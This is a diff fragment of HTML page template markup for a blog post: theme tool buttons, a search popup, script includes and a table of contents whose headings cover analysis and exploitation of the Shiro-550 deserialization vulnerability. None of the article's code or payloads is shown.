+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro-550-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">shiro-550 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt-%E8%A7%A3%E5%AF%86"><span class="nav-text">decrypt()解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#deserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">deserialize()反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-text">加密过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro-550%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">shiro-550漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86"><span class="nav-text">加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC11"><span class="nav-text">CC11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CB1"><span class="nav-text">CB1</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
